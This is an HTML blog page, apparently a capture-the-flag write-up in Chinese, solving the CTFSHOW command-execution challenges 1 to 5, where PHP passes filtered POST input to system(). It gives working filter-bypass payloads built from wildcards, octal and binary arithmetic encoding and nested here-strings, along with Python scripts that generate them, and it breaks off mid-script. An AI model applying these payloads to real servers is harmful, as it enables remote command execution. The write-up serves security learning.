@@ -1,0 +1,375 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>CTFSHOW 极限命令执行 wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="CTFSHOW 极限命令执行1123456789101112131415&amp;lt;?php//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。//flag在根目录flag里，或者直接运行根目录getflaghighlight_file(__FILE__);if (isset($_POST">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="CTFSHOW 极限命令执行 wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												CTFSHOW 极限命令执行 wp
+									
+									
+								</h1>
+								
+									<p id="/2023/09/28/CTFSHOW-extremeRCE-wp/" class="leancloud-visitors view"
+										data-flag-title="CTFSHOW 极限命令执行 wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="CTFSHOW-极限命令执行1"><a href="#CTFSHOW-极限命令执行1" class="headerlink" title="CTFSHOW 极限命令执行1"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1-3947">CTFSHOW 极限命令执行1</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 可用字符：  ! $ &#x27; ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~ </span></span><br></pre></td></tr></table></figure>
+
+<p>可以用通配符执行命令</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1：ctf_show=/?????a?	<span class="comment"># /getflag</span></span><br><span class="line">payload2：ctf_show=/???/?a??64 /??a?		<span class="comment"># /bin/base64 /flag</span></span><br><span class="line">payload3: ctf_show=/???/???/?a??64 /??a?	<span class="comment"># /usr/bin/base64 /flag</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CTFSHOW-极限命令执行2"><a href="#CTFSHOW-极限命令执行2" class="headerlink" title="CTFSHOW 极限命令执行2"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2-3948">CTFSHOW 极限命令执行2</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag在根目录flag里，或者直接运行根目录getflag</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检测过滤脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">alpha = string.printable</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line"></span><br><span class="line">	data = &#123;<span class="string">&quot;ctf_show&quot;</span>:i&#125;</span><br><span class="line">	res = requests.post(<span class="string">&quot;http://1b8d2008-3f7a-4db6-82fb-aef9af5e8893.challenge.ctf.show/&quot;</span>, data=data)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> res.text.endswith(<span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">		t+=i+<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># 0 1 2 3 4 5 6 7 8 9 ! # $ &amp; &#x27; ( ) &lt; \ _ &#123; &#125; ~</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤了问号  这里使用<strong>8进制</strong>数字编码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $<span class="string">&#x27;\154\163&#x27;</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">printf</span> <span class="string">&#x27;\154\163&#x27;</span></span><br><span class="line">$ $<span class="string">&#x27;\154\163&#x27;</span> <span class="comment"># 相当于执行ls</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CTFSHOW-极限命令执行3"><a href="#CTFSHOW-极限命令执行3" class="headerlink" title="CTFSHOW 极限命令执行3"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C3-3949">CTFSHOW 极限命令执行3</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检测过滤脚本得到可用字符<code>0 1 ! # $ &amp; &#39; ( ) &lt; \ _ &#123; &#125; ~</code></p>
+<p>数字只有0和1可用  想着能不能通过二进制来构造  bash中<code>$(())</code>可以进行数学运算  <code>$((2#101...))</code>将二进制串解释为十进制</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $((<span class="number">1</span>*<span class="number">3</span>))</span><br><span class="line">3</span><br><span class="line">$ <span class="built_in">echo</span> $((<span class="number">2#101</span>))</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以通过二进制构造不同数字，再通过数字编码来执行命令</p>
+<p>但是2也是不可用的，怎么办呢？同样可以通过数学运算得来：<code>$((1&lt;&lt;1))</code>  则<code>$((2#101...)) -&gt; $(($((1&lt;&lt;1))#101...))</code></p>
+<p>接着就可以构造数字编码了，以<code>ls</code>为例对应八进制数字编码为 ‘\154\163’</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))<span class="comment">#101))</span></span><br><span class="line">5</span><br><span class="line">$ <span class="built_in">echo</span> \<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\&#x27;</span>	<span class="comment"># 注意&#x27;和\都要转义</span></span><br><span class="line"><span class="string">&#x27;\154&#x27;</span></span><br><span class="line">$ <span class="built_in">echo</span> \<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;</span></span><br><span class="line"><span class="string">&#x27;\154\163&#x27;</span></span><br><span class="line">$ $\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;</span></span><br><span class="line">$<span class="string">&#x27;\154\163&#x27;</span>: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
+
+<p>发现虽然成功解析出，但没有进一步解释执行  这里需要用到两个知识</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;&lt;&lt;三个小于号(here-strings)，语法：<span class="built_in">command</span> [args] &lt;&lt;&lt;[<span class="string">&quot;]<span class="variable">$word</span>[&quot;</span>]；<span class="variable">$word</span>会展开并作为<span class="built_in">command</span>的stdin</span><br><span class="line">2. <span class="variable">$0</span> 即为bash</span><br></pre></td></tr></table></figure>
+
+<p>那么将输出作为bash的stdin即可解释执行，发送payload后也可以看到成功执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;$\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;</span>	  <span class="comment"># ls</span></span><br><span class="line"></span><br><span class="line">check.php index.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="二进制命令脚本"><a href="#二进制命令脚本" class="headerlink" title="二进制命令脚本"></a>二进制命令脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;ls&#x27;</span></span><br><span class="line">res = <span class="string">&quot;$0&lt;&lt;&lt;$\\&#x27;&quot;</span>	<span class="comment"># res = &quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">	t = <span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:], <span class="number">10</span>)</span><br><span class="line">	t = <span class="built_in">bin</span>(t)</span><br><span class="line">	res +=<span class="string">&quot;\\\\$(($((1&lt;&lt;1))#&quot;</span> + t[<span class="number">2</span>:] + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">&quot;\\&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>若是执行<code>cat /flag</code> 则会报错</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;$\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span></span><br><span class="line">bash: line 1: <span class="built_in">cat</span> /flag: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>这是因为bash执行不了带参数的命令 会将<code>cat /flag</code>整个字符串当成命令执行，所以找不到该文件</p>
+<p>那么可以使用两次here-strings来解决</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;<span class="variable">$0</span>\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&#123;&#123;flag  here I am !!!!&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CTFSHOW-极限命令执行4"><a href="#CTFSHOW-极限命令执行4" class="headerlink" title="CTFSHOW 极限命令执行4"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4-3950">CTFSHOW 极限命令执行4</a></h2><p>可用字符<code>0 ! # $ &amp; &#39; ( ) &lt; \ _ &#123; &#125; ~</code></p>
+<p>字符<code>1</code>也被过滤了，那就想有没有办法构造字符1</p>
+<p><strong>补充知识：</strong>  <code>$ = 1</code>  因此可以用<code>$</code>来代替1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">res = <span class="string">&quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">	t = <span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:], <span class="number">10</span>)</span><br><span class="line">	t = <span class="built_in">bin</span>(t)</span><br><span class="line">	res +=<span class="string">&quot;\\\\$(($((1&lt;&lt;1))#&quot;</span> + t[<span class="number">2</span>:] + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">&quot;\\&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">res = res.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;$&#123;##&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># $0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功执行得到flag</p>
+<h2 id="CTFSHOW-极限命令执行5"><a href="#CTFSHOW-极限命令执行5" class="headerlink" title="CTFSHOW 极限命令执行5"></a><a target="_blank" rel="noopener" href="https://ctf.show/challenges#%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C5-3951">CTFSHOW 极限命令执行5</a></h2><p>可用字符<code>! $ &amp; &#39; ( ) &lt; = \ _ &#123; &#125; ~</code></p>
+<p>字符<code>0, #</code>也不能用了   这里继续使用数学运算得到各数字  <code>$(())</code>会计算括号中的表达式得到结果</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $(())</span><br><span class="line">0</span><br><span class="line">$ <span class="built_in">echo</span> $((~$(())))	<span class="comment"># $((~0))</span></span><br><span class="line">-1</span><br><span class="line">$ <span class="built_in">echo</span> $((~$(())))$((~$(())))</span><br><span class="line">-1-1</span><br><span class="line">$ <span class="built_in">echo</span> $(($((~$(())))$((~$(())))))	<span class="comment"># $((-1-1))</span></span><br><span class="line">-2</span><br><span class="line">$ <span class="built_in">echo</span> $((~$(($((~$(())))$((~$(())))))))	<span class="comment"># $((~(-2)))</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>由此  我们可以不用数字来构造命令  但是仍需要here-string来解释执行命令  但是0不可用，想着是否有别的替代方式</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;!#&#125;</span></span><br><span class="line">bash</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;!?&#125;</span></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<p>可见这两种都可以充当bash，但是<code>#, ?</code>被过滤</p>
+<p><strong><code>!</code>功能一览：</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">!!	<span class="comment"># 上一条命令</span></span><br><span class="line">!$	<span class="comment"># 上一条命令中的最后一个参数</span></span><br><span class="line">!:-	<span class="comment"># 上一命令除了最后一个参数</span></span><br><span class="line">!*	<span class="comment"># 上一条命令中的所有参数</span></span><br><span class="line">!str	<span class="comment"># 最近一条以str开头的命令</span></span><br><span class="line">!?str?	<span class="comment"># 最近一条包含str的命令</span></span><br><span class="line">!n	<span class="comment"># 顺数第n条命令</span></span><br><span class="line">!-n	<span class="comment"># 倒数第n条命令</span></span><br><span class="line">^old^new	<span class="comment"># 将上一命令中的old替换为new</span></span><br><span class="line">!!:gs/old/new	<span class="comment"># 将上一命令中的old替换为new</span></span><br><span class="line">!scp:gs/old/new	<span class="comment"># 将上一scp命令中的old替换为new</span></span><br></pre></td></tr></table></figure>
+
+<p>那么有</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ __=$(())&amp;&amp;<span class="built_in">echo</span> <span class="variable">$__</span></span><br><span class="line">0</span><br><span class="line">$ !__</span><br><span class="line">__=$(())&amp;&amp;<span class="built_in">echo</span> <span class="variable">$__</span>	<span class="comment"># 此处__开头的命令被再次执行</span></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">$ __=$(())</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;!__&#125;</span></span><br><span class="line">bash</span><br><span class="line"></span><br><span class="line">$ __=$(())&amp;&amp;<span class="variable">$&#123;!__&#125;</span>&lt;&lt;&lt;<span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>
+
+<p>即可以用<code>__=$(())&amp;&amp;$&#123;!__&#125;</code>来代替<code>$0</code></p>
+<h3 id="构造脚本"><a href="#构造脚本" class="headerlink" title="构造脚本"></a>构造脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">res = <span class="string">&quot;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">	t = <span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:], <span class="number">10</span>)</span><br><span class="line">	</span><br><span class="line">	res +=<span class="string">&quot;\\\\$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (t + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span>	<span class="comment"># 这里重复-1-1-1...然后计算凑成目标数</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">&quot;\\&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=__=$(())%<span class="number">26</span>%<span class="number">26</span>$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$((.........))\&#x27;		# 注意&amp;&amp;要url编码</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="构造脚本2"><a href="#构造脚本2" class="headerlink" title="构造脚本2"></a>构造脚本2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;ls&#x27;</span></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span>	<span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span 